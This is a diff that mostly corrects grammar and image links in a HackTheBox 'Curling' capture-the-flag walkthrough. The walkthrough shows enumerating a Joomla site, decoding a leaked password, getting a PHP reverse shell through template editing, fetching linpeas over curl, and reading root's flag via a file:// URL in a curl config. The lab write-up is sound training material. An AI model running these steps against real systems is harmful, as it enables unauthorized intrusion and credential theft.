@@ -1,8 +1,8 @@
-Begin with binding machine IP to custom domain.
+Begin with binding the machine IP to a custom domain.
 
 ![[HackTheBox/Curling/images/1.png]]
 
-Conduct port scanning `sudo nmap -sV -sC curling.htb`
+Conduct port scanning with `sudo nmap -sV -sC curling.htb`.
 
 ![[HackTheBox/Curling/images/2.png]]
 
@@ -10,15 +10,15 @@ Let's check `Joomla`:
 
 ![[HackTheBox/Curling/images/3.png]]
 
-There were nothing valuable in this page. I also conducted a port scan with `--script=vuln` NSE engine.
+There was nothing valuable on this page. I also conducted a port scan with the `--script=vuln` NSE engine.
 
 `sudo nmap -sV --script=vuln --max-rate=10000 curling.htb`
 
-It reveals some potentially interesting directories & version number of `Joomla` which is 3.8.8.
+It reveals some potentially interesting directories and the version number of `Joomla`, which is 3.8.8.
 
 ![[HackTheBox/Curling/images/4.png]]
 
-I iterated multiple fuzzing attempts ,yet no juicy information available except the `administrator` endpoint here is what kind of tools & commands I ran so far.
+I iterated multiple fuzzing attempts, yet no juicy information was available except the `administrator` endpoint. Here are the tools and commands I ran so far:
 
 ```bash
 gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
@@ -34,36 +34,36 @@ gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirb/common.txt
 gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-Furthermore, I applied also `-r` parameter to fuzz deeply. After a couple of minutes belonging with source code analysis I decided to search for patterns like `password` `hint`. However, still did not find anything ,but after I analyzed patiently I found that last line includes `secret.txt` as hint.
+Furthermore, I also applied the `-r` parameter to fuzz more deeply. After a couple of minutes of source code analysis, I decided to search for patterns like `password` and `hint`. However, I still did not find anything. After analyzing patiently, I found that the last line of the source code includes `secret.txt` as a hint.
 
 ![[HackTheBox/Curling/images/5.png]]
 
 
-`Q3VybGluZzIwMTgh` a txt includes such thing like a password. Then I wanted also push this to `Cyberchef` ->
+`Q3VybGluZzIwMTgh` - a text file that includes something that looks like a password. I then pushed this to `CyberChef`:
 
 ![[HackTheBox/Curling/images/6.png]]
 
-This sounds like a pass: `Curling2018!` ,yet username ?
+This looks like a password: `Curling2018!`, but what about the username?
 
-One of the posts mentions about curling and 2018 strings then I saw floris at the end of the thread message.
+One of the posts mentions curling and 2018 strings, and I noticed `Floris` at the end of the thread message.
 
 ![[HackTheBox/Curling/images/7.png]]
 
-I tried `Floris:Curling2018!` and logged as `superadmin` according to the right side of the side.
+I tried `Floris:Curling2018!` and logged in as `Super User` according to the right side of the page.
 
 ![[HackTheBox/Curling/images/8.png]]
 
-Since I was able to sign in directly here. What about using through admin login page.
+Since I was able to sign in on the frontend, what about using the admin login page?
 
-It works !
+It works!
 
 ![[HackTheBox/Curling/images/9.png]]
 
-Initially, it will be appropriate to use github exploit just because more accessible and direct solution. Plus, it requires authenticated user ,so lets move on it.
+Initially, it would be appropriate to use a GitHub exploit since it is a more accessible and direct solution. Plus, it requires an authenticated user, so let's move on.
 
 ![[HackTheBox/Curling/images/10.png]]
 
-Direct run was not possible. Therefore, the best useful way is that create your virtual environment via `python -m venv venv` then install requirements line by line.
+Direct execution was not possible. Therefore, the best approach is to create a virtual environment via `python -m venv venv` and then install the requirements line by line.
 
 ```bash
 pip install requests
@@ -71,52 +71,52 @@ pip install lxml
 pip install log_colors
 ```
 
-Now usage is easy just to follow the guideline:
+Now the usage is easy, just follow the guideline:
 
 ![[HackTheBox/Curling/images/11.png]]
 
-The script stucks ,so I manually reach the endpoint where shell payload executed.
+The script gets stuck, so I manually reached the endpoint where the shell payload was executed.
 
 `/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=`
 
 ![[HackTheBox/Curling/images/12.png]]
 
-Generic `PentestMonkey` works just because application running on `PHP` on backend side ,but at this time I'll use reverse shell generator's payload.
+A generic `PentestMonkey` shell works since the application is running on `PHP` on the backend side, but this time I will use reverse shell generator's payload.
 
-Start to invoke listener ->
+Start the listener:
 
 ```bash
 penelope -p 1234
 ```
 
-I used Ivan Sencek's payload:
+I used Ivan Sincek's payload.
 
-Save and execute PHP script through `template preview` option which runs server side script.
+Save and execute the PHP script through the `template preview` option, which runs the server-side script.
 
 ![[HackTheBox/Curling/images/13.png]]
 
-You must get `floris` account to get user flag and I discovered a file called `password_backup` then including weird things.
+You need to get the `floris` account to obtain the user flag. I discovered a file called `password_backup` that contains some weird content.
 
 ![[HackTheBox/Curling/images/14.png]]
 
-I searched for `BZh91AY` and identified such pattern in overthewire challenge.
+I searched for `BZh91AY` and identified this pattern in an OverTheWire challenge.
 
 [Challenge](https://david-varghese.medium.com/overthewire-bandit-level-12-level-13-2ec761a88907)
 
-Let's use ->
+Let's use:
 
 ```bash
 xxd -r data > binary
 ls  binary  data
 ```
 
-target machine has `/usr/bin/xxd` binary.
+The target machine has the `/usr/bin/xxd` binary.
 
-I got permission error on while I was working on `floris` user then moved `tmp` directory.
+I got a permission error while working in the `floris` user's home directory, so I moved to the `/tmp` directory.
 
 ![[HackTheBox/Curling/images/15.png]]
 
-The challenge suggested that identify the file type ->
+The challenge suggested identifying the file type:
 
 ![[HackTheBox/Curling/images/16.png]]
 
@@ -124,7 +124,7 @@ The challenge suggested that identify the file type ->
 bunzip2 binary or bzip2 -d binary
 ```
 
-We have to go further ->
+We have to go further:
 
 ![[HackTheBox/Curling/images/17.png]]
 
@@ -153,54 +153,56 @@ cat password.txt
 5d<wdCbdZu)|hChXll
 ```
 
-Now this is the most probably password for SSH of floris.
+Now this is most probably the password for SSH as floris.
 
-Gotcha ! ! !
+Gotcha!!!
 
 ![[HackTheBox/Curling/images/21.png]]
 
-I checked for local privilege escalation vector via `sudo -l`.
+Now that we have SSH access as floris, we can read the user flag:
+
+![[HackTheBox/Curling/images/28.png]]
+
+I checked for a local privilege escalation vector via `sudo -l`.
 
 ![[HackTheBox/Curling/images/22.png]]
 
 It did not work.
 
-I did not find anything valuable on `admin-area` directory ,so lets start linpeas.
+I did not find anything valuable in the `admin-area` directory, so let's start linpeas.
 
 `curl http://10.10.15.57:1212/linpeas.sh -o linpeas.sh`
 
-did not useful.
+It was not useful.
 
-Somehow, admin-area directory includes interesting file formats regarding to the root path.
+However, the `admin-area` directory includes interesting file formats pointing to the root path.
 
 ![[HackTheBox/Curling/images/23.png]]
 
-It points out the localhost then `report` includes the parsed page.
+It points to localhost, and the `report` file includes the parsed page.
 
-![[24.png]]
+![[HackTheBox/Curling/images/24.png]]
 
-lets check to parse the page via `curl`:
+Let's check to parse the page via `curl`:
 
-![[25.png]]
+![[HackTheBox/Curling/images/25.png]]
 
-Observe that parsing results point out the same pages.
+Observe that the parsing results point to the same pages.
 
-I began to find a way to point to the target machine files to read root flag.
+I began to find a way to point to the target machine's files in order to read the root flag.
 
-I found a bug bounty report including the usage for these types of purposes:
+I found a bug bounty report that includes the usage for these types of purposes:
 
 [Report](https://hackerone.com/reports/3242087)
 
-Try them ->
+Let's try:
 
-![[26.png]]
+![[HackTheBox/Curling/images/26.png]]
 
 Alter the content of the `input` file as below:
 
 `url = "file:///root/root.txt"`
 
-then read the root flag from `cat report`
+Then read the root flag from `cat report`:
 
-![[27.png]]
-
-![[28.png]]
+![[HackTheBox/Curling/images/27.png]]
